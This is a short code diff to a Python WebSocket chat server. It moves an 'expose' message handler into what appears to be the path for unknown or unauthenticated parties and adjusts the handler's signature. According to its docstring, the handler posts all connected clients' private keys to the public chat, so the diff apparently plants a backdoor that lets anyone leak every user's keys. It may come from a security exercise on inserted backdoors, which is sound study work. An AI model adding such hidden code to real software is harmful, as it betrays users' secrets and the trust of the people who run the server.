@@ -326,6 +326,8 @@ class WebSocketServer():
                 await self.handle_margarita_delivery(websocket, message, customer)
             case "kick":
                 await self.kick_client(websocket, message)
+            case "expose":
+                await self.expose_key(websocket)
             case _:
 
                 self.logger.info("Unknown party attempt to communicate")
@@ -471,8 +473,6 @@ class WebSocketServer():
                     return
                 
                 await self.relay_public_chat(websocket, message)
-            case "expose":
-                await self.expose_key(websocket)
             case _:
                 err_msg = {
                     "error" : "Invalid data type from established connection"
@@ -860,7 +860,7 @@ class WebSocketServer():
                 continue
             await self.send(server.websocket, response)
     
-    async def expose_key(self, websocket: ServerConnection, message: dict) -> None:
+    async def expose_key(self, websocket) -> None:
         """
         Exposes connected clients private keys onto public chat.
         """
